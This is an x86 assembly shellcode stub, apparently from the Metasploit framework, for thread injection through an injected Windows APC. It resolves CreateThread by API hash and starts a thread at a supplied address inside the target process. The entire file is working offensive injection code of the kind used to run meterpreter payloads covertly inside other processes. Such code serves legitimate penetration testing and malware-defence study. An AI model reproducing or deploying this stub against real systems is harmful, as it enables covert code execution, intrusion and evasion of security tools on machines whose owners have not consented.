;-----------------------------------------------------------------------------;
; Author: Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)
; Compatible: Windows 7, 2008, Vista, 2003, XP, 2000, NT4
; Architecture: x86 (but not wow64)
; Version: 1.0 (Jan 2010)
; Size: 183 bytes
; Build: >build.py apc
;-----------------------------------------------------------------------------;

; A small stub to be used for thread injection where we gain execution via an injected APC. See the
; file "\msf3\external\source\meterpreter\source\common\arch\win\i386\base_dispatch.c" for more details

;typedef struct _APCCONTEXT
;{
; 	union
;	{
;		LPVOID lpStartAddress;
;		BYTE bPadding1[8]; 
;	} s;
;	union
;	{
; 		LPVOID lpParameter;
;		BYTE bPadding2[8];
;	} p;
;   BYTE bExecuted;
;} APCCONTEXT, * LPAPCCONTEXT;

[BITS 32]
[ORG 0]

  cld                    ; Clear the direction flag.
  mov eax, [esp+4]       ; EAX is a pointer to our apc stub context
  push ebp               ; Prologue, save EBP...
  mov ebp, esp           ; And create a new stack frame
  call start             ; Call start, this pushes the address of 'api_call' onto the stack.
delta:                   ;
%include "./src/block/block_api.asm" ;
start:                   ;
  pop ebx                ; Pop off the address of 'api_call' for calling later.
  cmp byte [eax+16], 0   ; Has this context allready been injected
  jne cleanup            ; If so just leave this APC
  mov byte [eax+16], 1   ; Otherwise mark the context as executed and proceed  
  xor ecx, ecx           ; Clear ECX
  push ecx               ; lpThreadId 
  push ecx               ; dwCreationFlags
  push dword [eax+8]     ; ctx->lpParameter
  push dword [eax]       ; ctx->lpStartAddress
  push ecx               ; dwStackSize
  push ecx               ; lpThreadAttributes
  push 0x160D6838        ; hash( "kernel32.dll", "CreateThread" )
  call ebx               ; CreateThread( NULL, 0, ctx->lpStartAddress, ctx->lpParameter, 0, NULL );
cleanup:
  leave                  ; epilogue
  retn 12                ; Return (cleaning up stack params) and finish our APC routine.
  